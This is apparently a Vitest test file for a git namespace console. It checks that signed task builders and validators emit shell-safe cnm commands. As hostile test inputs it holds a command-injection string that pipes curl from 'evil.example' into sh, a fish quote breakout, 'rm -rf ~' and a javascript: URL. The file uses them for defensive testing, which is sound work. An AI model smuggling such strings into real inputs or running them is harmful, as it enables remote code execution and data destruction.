import { execFileSync } from "node:child_process";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { describe, expect, it } from "vitest";

import type { GitNsDriftItem, GitNsNamespaceRow } from "@/lib/wire-types";

import {
  adoptTask,
  archiveTask,
  bindTask,
  createTask,
  didError,
  driftAdoptTask,
  driftRevertTask,
  expiryDaysError,
  forgeHostError,
  grantTask,
  nextUrlOf,
  reasonError,
  reseatTask,
  revokeTask,
  segmentError,
  shellQuote,
  statementError,
  transferTask,
  unbindTask,
  urlIsOnForge,
} from "./actions";

const BOB = "did:webvh:QmBob:bob.dev";

const ORG_NS: GitNsNamespaceRow = {
  id: "ns_acme",
  forge: "github.com",
  owner: "acme",
  resource: "github.com/acme",
  mode: "bridge",
  state: "bound",
  kind: "organization",
  bridgeDid: "did:webvh:QmBridge:bridge.acme.dev",
  boundBy: BOB,
  requestedAt: "2026-08-01T00:00:00Z",
  admins: [BOB],
  repoCount: 1,
  headless: false,
  installationRemoved: false,
  roleDrift: "report",
  cascadeOnDeparture: false,
};
const ROLE_ADDED: GitNsDriftItem = {
  type: "roleAdded",
  resource: "github.com/acme/widgets",
  observed: "maintain",
  account: { forge: "github.com", id: "1003", login: "hsato" },
};

describe("signed git-ns tasks", () => {
  it("builds a grant exactly as cnm will sign it", () => {
    const t = grantTask(
      {
        subject: BOB,
        right: "git.commit.sign",
        resource: "github.com/acme/widgets",
        expiresInDays: 90,
        reason: "Bob's first PR",
      },
      new Date("2026-09-23T00:00:00.000Z"),
    );
    expect(t.taskUri).toBe("https://trusttasks.org/spec/git-ns/right/grant/0.3");
    expect(t.payload).toEqual({
      subject: BOB,
      right: "git.commit.sign",
      resource: "github.com/acme/widgets",
      expiresAt: "2026-12-22T00:00:00Z",
      reason: "Bob's first PR",
    });
    expect(t.consent).toBe("normal");
    expect(t.command).toBe(
      `cnm git grant --subject=${BOB} --right=git.commit.sign --resource=github.com/acme/widgets --expires-in=90d --reason='Bob'"'"'s first PR'`,
    );
  });

  it("classes an owner grant elevated and an ns.admin grant destructive", () => {
    expect(grantTask({ subject: BOB, right: "git.repo.own", resource: "github.com/acme/x" }).consent).toBe(
      "elevated",
    );
    expect(grantTask({ subject: BOB, right: "git.ns.admin", resource: "github.com/acme" }).consent).toBe(
      "destructive",
    );
  });

  it("builds a revoke, bind, unbind and adopt with their cnm commands", () => {
    expect(revokeTask(BOB, "git.repo.maintain", "github.com/acme/x").command).toBe(
      `cnm git revoke --subject=${BOB} --right=git.repo.maintain --resource=github.com/acme/x`,
    );
    const bind = bindTask("github.com", "acme", "bridge");
    expect(bind.payload).toEqual({ forge: "github.com", owner: "acme", mode: "bridge" });
    expect(bind.command).toBe("cnm git namespace bind --forge=github.com --owner=acme --mode=bridge");
    expect(bind.consent).toBe("destructive");
    expect(unbindTask("ns_1", "github.com/acme").payload).toEqual({ namespace: "ns_1" });
    expect(adoptTask("github.com/acme/x", [BOB]).command).toBe(
      `cnm git adopt github.com/acme/x --owner=${BOB}`,
    );
  });

  it("builds create, transfer and archive with the cnm verbs #1694 added", () => {
    expect(transferTask("github.com/acme/x", BOB)).toMatchObject({
      payload: { resource: "github.com/acme/x", to: BOB },
      command: `cnm git transfer github.com/acme/x --to=${BOB}`,
      consent: "elevated",
    });
    expect(archiveTask("github.com/acme/x")).toMatchObject({
      taskUri: "https://trusttasks.org/spec/git-ns/repo/archive/0.1",
      command: "cnm git archive github.com/acme/x",
    });
    const c = createTask({
      namespaceId: "ns_1",
      namespaceResource: "github.com/acme",
      name: "gadgets",
      visibility: "public",
      description: "Gadget tools",
      personal: false,
    });
    expect(c.taskUri).toBe("https://trusttasks.org/spec/git-ns/repo/create/0.3");
    expect(c.payload).toEqual({
      namespace: "ns_1",
      name: "gadgets",
      visibility: "public",
      description: "Gadget tools",
    });
    expect(c.command).toBe(
      "cnm git create --namespace=ns_1 gadgets --visibility=public --description='Gadget tools'",
    );
    // A namespace admin names the owner (`git-ns/repo/create` 0.3).
    const forBob = createTask({
      namespaceId: "ns_1",
      namespaceResource: "github.com/acme",
      name: "gadgets",
      visibility: "public",
      owners: ["did:web:bob.example"],
      personal: false,
    });
    expect(forBob.payload).toMatchObject({ owners: ["did:web:bob.example"] });
    expect(forBob.command).toContain("--owner=did:web:bob.example");
    expect(forBob.effect).toContain("did:web:bob.example becomes its owner.");
    expect(c.consent).toBe("normal");
  });

  it("builds a reseat as git-ns/namespace/reseat 0.1 and cnm git reseat sign it", () => {
    const t = reseatTask(
      "ns_acme",
      "github.com/acme",
      BOB,
      "  Alice left on 2026-09-20; Bob owns most repos and agreed.  ",
    );
    expect(t.action).toBe("namespace.reseat");
    expect(t.taskUri).toBe("https://trusttasks.org/spec/git-ns/namespace/reseat/0.1");
    // Exactly the spec's three fields, statement trimmed; nothing else.
    expect(t.payload).toEqual({
      namespace: "ns_acme",
      subject: BOB,
      statement: "Alice left on 2026-09-20; Bob owns most repos and agreed.",
    });
    expect(t.consent).toBe("destructive");
    expect(t.consentNote).toMatch(/community-administrator capability/);
    expect(t.resource).toBe("github.com/acme");
    expect(t.parties).toEqual([{ role: "Becomes namespace admin", did: BOB }]);
    expect(t.command).toBe(
      `cnm git reseat ns_acme --subject=${BOB} --statement='Alice left on 2026-09-20; Bob owns most repos and agreed.'`,
    );
  });

  it("builds a drift revert selecting the item by type, account and observed value", () => {
    const t = driftRevertTask("github.com/acme/widgets", ORG_NS, ROLE_ADDED, " not ours ");
    expect(t.taskUri).toBe("https://trusttasks.org/spec/git-ns/drift/resolve/0.1");
    expect(t.payload).toEqual({
      resource: "github.com/acme/widgets",
      action: "revert",
      drift: {
        type: "roleAdded",
        account: { forge: "github.com", id: "1003", login: "hsato" },
        observed: "maintain",
      },
      reason: "not ours",
    });
    // A maintain role weighs as revoking maintain: normal.
    expect(t.consent).toBe("normal");
    expect(t.parties).toEqual([]);
    expect(t.command).toBe(
      "cnm git drift resolve github.com/acme/widgets revert --type=roleAdded --account-id=1003 --account-login=hsato --observed=maintain --reason='not ours'",
    );
  });

  it("classes taking an admin role off the forge as the owner revocation it weighs as", () => {
    const admin = { ...ROLE_ADDED, observed: "admin" };
    expect(driftRevertTask("github.com/acme/widgets", ORG_NS, admin).consent).toBe("elevated");
    // Re-adding a projected role is never more than maintain.
    expect(
      driftRevertTask("github.com/acme/widgets", ORG_NS, { ...admin, type: "roleRemoved" }).consent,
    ).toBe("normal");
    // On a personal account `admin` projects nothing.
    expect(
      driftRevertTask("github.com/glenn-g/x", { ...ORG_NS, kind: "user" }, admin).consent,
    ).toBe("normal");
  });

  it("builds a drift adopt carrying the selector and the member who receives the right", () => {
    const t = driftAdoptTask("github.com/acme/widgets", ROLE_ADDED, BOB, "git.repo.maintain", "on the team");
    expect(t.taskUri).toBe("https://trusttasks.org/spec/git-ns/drift/resolve/0.1");
    expect(t.payload).toEqual({
      resource: "github.com/acme/widgets",
      action: "adopt",
      drift: {
        type: "roleAdded",
        account: { forge: "github.com", id: "1003", login: "hsato" },
        observed: "maintain",
      },
      reason: "on the team",
    });
    expect(t.consent).toBe("normal");
    expect(t.parties).toEqual([{ role: "Receives the right", did: BOB }]);
    expect(t.command).toBe(
      "cnm git drift resolve github.com/acme/widgets adopt --type=roleAdded --account-id=1003 --account-login=hsato --observed=maintain --reason='on the team'",
    );
    // Adopting ownership is gated as the elevated grant it records.
    expect(
      driftAdoptTask("github.com/acme/widgets", { ...ROLE_ADDED, observed: "admin" }, BOB, "git.repo.own")
        .consent,
    ).toBe("elevated");
  });

  it("leaves the account out of a ruleset revert", () => {
    const t = driftRevertTask("github.com/acme/widgets", ORG_NS, {
      type: "requiredCheckMissing",
      resource: "github.com/acme/widgets",
      expected: "required",
    });
    expect(t.payload).toEqual({
      resource: "github.com/acme/widgets",
      action: "revert",
      drift: { type: "requiredCheckMissing" },
    });
    expect(t.command).toBe(
      "cnm git drift resolve github.com/acme/widgets revert --type=requiredCheckMissing",
    );
  });

  it("reads next.url from a bind response, https only", () => {
    expect(nextUrlOf({ next: { url: "https://github.com/apps/x/installations/new?state=1" } })).toBe(
      "https://github.com/apps/x/installations/new?state=1",
    );
    expect(nextUrlOf({ next: { url: "javascript:alert(1)" } })).toBeNull();
    expect(nextUrlOf({ namespace: {} })).toBeNull();
  });
});

describe("validation, as the specs state it", () => {
  it("wants a lowercase DNS host with no scheme", () => {
    expect(forgeHostError("github.com")).toBeNull();
    expect(forgeHostError("git.example.org")).toBeNull();
    expect(forgeHostError("GitHub.com")).toMatch(/lowercase/);
    expect(forgeHostError("https://github.com")).toMatch(/host only/);
    expect(forgeHostError("")).toMatch(/Name the forge/);
  });

  it("wants one lowercase segment without a leading dot", () => {
    expect(segmentError("acme")).toBeNull();
    expect(segmentError("Acme")).toMatch(/lowercase/);
    expect(segmentError("acme/widgets")).toMatch(/without slashes/);
    expect(segmentError(".github")).toMatch(/dot/);
  });

  it("wants a DID", () => {
    expect(didError(BOB)).toBeNull();
    expect(didError("bob")).toMatch(/Not a DID/);
  });

  it("quotes only what the shell would split", () => {
    expect(shellQuote("github.com/acme")).toBe("github.com/acme");
    expect(shellQuote("two words")).toBe("'two words'");
  });
});

describe("every command is safe to paste into a shell", () => {
  // The review's payload: a string that passed the old DID check and runs a
  // pipeline when pasted unquoted.
  const EVIL = "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)";
  const NS = "github.com/acme";
  const REPO = "github.com/acme/widgets";

  const builders: [string, (v: string) => { command: string }][] = [
    ["grant subject", (v) => grantTask({ subject: v, right: "git.commit.sign", resource: REPO })],
    ["grant resource", (v) => grantTask({ subject: BOB, right: "git.commit.sign", resource: v })],
    ["grant reason", (v) => grantTask({ subject: BOB, right: "git.commit.sign", resource: REPO, reason: v })],
    ["revoke subject", (v) => revokeTask(v, "git.repo.maintain", REPO)],
    ["revoke resource", (v) => revokeTask(BOB, "git.repo.maintain", v)],
    ["revoke reason", (v) => revokeTask(BOB, "git.repo.maintain", REPO, v)],
    ["adopt resource", (v) => adoptTask(v, [BOB])],
    ["adopt owner", (v) => adoptTask(REPO, [v])],
    ["transfer resource", (v) => transferTask(v, BOB)],
    ["transfer recipient", (v) => transferTask(REPO, v)],
    ["archive resource", (v) => archiveTask(v)],
    ["bind forge", (v) => bindTask(v, "acme", "bridge")],
    ["bind owner", (v) => bindTask("github.com", v, "bridge")],
    ["unbind namespace", (v) => unbindTask(v, NS)],
    ["reseat namespace", (v) => reseatTask(v, NS, BOB, "Alice left")],
    ["reseat subject", (v) => reseatTask("ns_1", NS, v, "Alice left")],
    ["reseat statement", (v) => reseatTask("ns_1", NS, BOB, v)],
    ["drift revert resource", (v) => driftRevertTask(v, ORG_NS, ROLE_ADDED)],
    [
      "drift revert account",
      (v) => driftRevertTask(REPO, ORG_NS, { ...ROLE_ADDED, account: { forge: "github.com", id: v, login: "x" } }),
    ],
    [
      "drift revert login",
      (v) => driftRevertTask(REPO, ORG_NS, { ...ROLE_ADDED, account: { forge: "github.com", id: "1", login: v } }),
    ],
    ["drift revert observed", (v) => driftRevertTask(REPO, ORG_NS, { ...ROLE_ADDED, observed: v })],
    ["drift revert reason", (v) => driftRevertTask(REPO, ORG_NS, ROLE_ADDED, v)],
    ["drift adopt resource", (v) => driftAdoptTask(v, ROLE_ADDED, BOB, "git.repo.maintain")],
    [
      "drift adopt account",
      (v) =>
        driftAdoptTask(REPO, { ...ROLE_ADDED, account: { forge: "github.com", id: v, login: "x" } }, BOB, "git.repo.maintain"),
    ],
    ["drift adopt observed", (v) => driftAdoptTask(REPO, { ...ROLE_ADDED, observed: v }, BOB, "git.repo.maintain")],
    ["drift adopt reason", (v) => driftAdoptTask(REPO, ROLE_ADDED, BOB, "git.repo.maintain", v)],
    [
      "create namespace",
      (v) => createTask({ namespaceId: v, namespaceResource: NS, name: "x", visibility: "public", personal: false }),
    ],
    [
      "create name",
      (v) => createTask({ namespaceId: "ns_1", namespaceResource: NS, name: v, visibility: "public", personal: false }),
    ],
    [
      "create description",
      (v) =>
        createTask({ namespaceId: "ns_1", namespaceResource: NS, name: "x", visibility: "public", description: v, personal: false }),
    ],
  ];

  /** What sh makes of `cmd`'s arguments, without running `cnm`. */
  function shellWords(cmd: string): string[] {
    return argvIn("sh", cmd.replace(/^cnm git /, ""));
  }

  it.each(builders)("%s: the payload reaches cnm as one literal argument", (_, build) => {
    for (const value of [EVIL, "-rf", "a'b", "$HOME", "x; rm -rf ~", "`id`", FISH_BREAKOUT]) {
      const words = shellWords(build(value).command);
      // Exactly the value, whole — bare as a positional or bound to its flag.
      expect(words.some((word) => word === value || word.endsWith(`=${value}`))).toBe(true);
      // Nothing expanded or split: no word is a fragment of the value.
      expect(words.filter((word) => word !== value && value.includes(word) && word.length > 1)).toEqual([]);
    }
  });

  it("never leaves a value that starts with a dash bare", () => {
    expect(shellQuote("-x")).toBe("'-x'");
    expect(shellQuote("")).toBe("''");
    expect(adoptTask("--help", [BOB]).command).toContain("'--help'");
  });
});

// ── the same bytes back in every shell a console user might paste into ──

/** POSIX's `'\''` quoting breaks out here in fish, which reads `\'` and `\\`
 *  as escapes inside single quotes: pasted into fish it runs `echo INJECTED`. */
const FISH_BREAKOUT = "x\\' ; echo INJECTED ; echo \\";

const HOSTILE = [
  FISH_BREAKOUT,
  "it's",
  "'",
  "''",
  "\\",
  "\\\\",
  "\\'",
  "'\\",
  "a\\'b\\\\'c",
  "\\n\\t\\0",
  "$(echo INJECTED)",
  "${HOME}",
  "$HOME",
  "$fish_pid",
  "`echo INJECTED`",
  "(echo INJECTED)",
  "line one\nline two\n",
  "\n",
  "tab\there",
  "emoji 🦀 and ünïcödé",
  "-rf",
  "--help",
  "-",
  "=ls",
  "%self",
  "~",
  "~root",
  "*",
  "{a,b}",
  "a;b|c&d>e<f",
  '"double" quotes',
  "#not a comment",
  "",
  " ",
  "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)",
  "github.com/acme/widgets",
];

const SHELL_HOME = mkdtempSync(join(tmpdir(), "vtc-shellquote-"));

/** The argv `args` (a string of shell words) gives a program in `shell`,
 *  read back through an external printf so no shell's builtin differs. */
function argvIn(shell: string, args: string): string[] {
  const out = execFileSync(shell, ["-c", `env printf '%s\\0' ${args}`], {
    encoding: "utf8",
    // A throwaway HOME: no user rc file runs, and fish has somewhere to write.
    env: { PATH: process.env.PATH ?? "/usr/bin:/bin", HOME: SHELL_HOME },
    stdio: ["ignore", "pipe", "pipe"],
  });
  return out.split("\0").slice(0, -1);
}

function installed(shell: string): boolean {
  try {
    execFileSync(shell, ["-c", "true"], { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
}

describe("shellQuote — exact output", () => {
  it.each([
    ["github.com/acme", "github.com/acme"],
    ["did:webvh:QmBob:bob.dev", "did:webvh:QmBob:bob.dev"],
    ["two words", "'two words'"],
    ["", "''"],
    ["-rf", "'-rf'"],
    ["=ls", "'=ls'"],
    ["%self", "'%self'"],
    ["a=b", "a=b"],
    ["it's", `'it'"'"'s'`],
    ["'", `"'"`],
    ["\\", `"\\\\"`],
    ["\\'", `"\\\\""'"`],
    [FISH_BREAKOUT, `'x'"\\\\""'"' ; echo INJECTED ; echo '"\\\\"`],
    ["$(id)", "'$(id)'"],
    ["`id`", "'`id`'"],
    ["a\nb", "'a\nb'"],
    ["🦀", "'🦀'"],
  ])("%j → %s", (value, quoted) => {
    expect(shellQuote(value)).toBe(quoted);
  });
});

describe.each(["sh", "bash", "zsh", "fish"])("shellQuote round-trips in %s", (shell) => {
  const present = installed(shell);
  // sh and bash are on every CI runner; zsh and fish are checked where present.
  if (shell === "sh" || shell === "bash") {
    it(`${shell} is installed`, () => expect(present).toBe(true));
  }

  it.skipIf(!present)("each hostile value comes back byte-exact, as one argument", () => {
    const argv = argvIn(shell, HOSTILE.map(shellQuote).join(" "));
    expect(argv).toEqual(HOSTILE);
  });

  it.skipIf(!present)("each value survives alone and bound to a flag", () => {
    for (const value of HOSTILE) {
      expect(argvIn(shell, shellQuote(value))).toEqual([value]);
      expect(argvIn(shell, `--reason=${shellQuote(value)}`)).toEqual([`--reason=${value}`]);
    }
  }, 60_000);

  it.skipIf(!present)("a whole reseat command reaches cnm intact", () => {
    const t = reseatTask(FISH_BREAKOUT, "github.com/acme", BOB, FISH_BREAKOUT);
    expect(argvIn(shell, t.command.replace(/^cnm /, ""))).toEqual([
      "git",
      "reseat",
      FISH_BREAKOUT,
      `--subject=${BOB}`,
      `--statement=${FISH_BREAKOUT}`,
    ]);
  });
});

describe("didError — DID Core syntax", () => {
  it("accepts DIDs, including pct-encoded ids and colon segments", () => {
    for (const did of [
      "did:webvh:QmAlice:alice.dev",
      "did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK",
      "did:web:example.com%3A8443:users:alice",
    ]) {
      expect(didError(did)).toBeNull();
    }
  });

  it("refuses anything a shell or a parser would read differently", () => {
    for (const bad of [
      "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)",
      "did:web:x example",
      "did:Web:x",
      "did:web:",
      "did:web:x:",
      "did:web:x%zz",
      "did:web:x#",
      "did:web:x/path",
      "did:web:x?service=files",
      // A DID URL names a key or a service, not a party (DID-core, as the VTC
      // checks it).
      "did:web:example.com#key-1",
      "did:webvh:QmBob:bob.dev#key-0",
      `did:key:${"a".repeat(1024)}`,
    ]) {
      expect(didError(bad)).not.toBeNull();
    }
    expect(didError("did:web:example.com#key-1")).toMatch(/fragment/);
  });
});

describe("form limits", () => {
  it("bounds expiry to whole days between 1 and 3650", () => {
    expect(expiryDaysError("")).toBeNull();
    expect(expiryDaysError("30")).toBeNull();
    expect(expiryDaysError("3650")).toBeNull();
    expect(expiryDaysError("3651")).toMatch(/At most 3650/);
    expect(expiryDaysError("1.5")).toMatch(/Whole days/);
    expect(expiryDaysError("0")).toMatch(/Whole days/);
  });

  it("bounds a reason to 1024 characters", () => {
    expect(reasonError("x".repeat(1024))).toBeNull();
    expect(reasonError("x".repeat(1025))).toMatch(/At most 1024 characters — it is 1025/);
  });

  it("requires a reseat statement of at most 1024 characters", () => {
    expect(statementError("")).toMatch(/Say why/);
    expect(statementError("   ")).toMatch(/Say why/);
    expect(statementError("x".repeat(1024))).toBeNull();
    expect(statementError("x".repeat(1025))).toMatch(/At most 1024 characters — it is 1025/);
  });

  it("only calls a next URL on the forge when its host is the forge", () => {
    expect(urlIsOnForge("https://github.com/apps/x/installations/new", "github.com")).toBe(true);
    expect(urlIsOnForge("https://github.com.evil.example/x", "github.com")).toBe(false);
    expect(urlIsOnForge("not a url", "github.com")).toBe(false);
  });
});
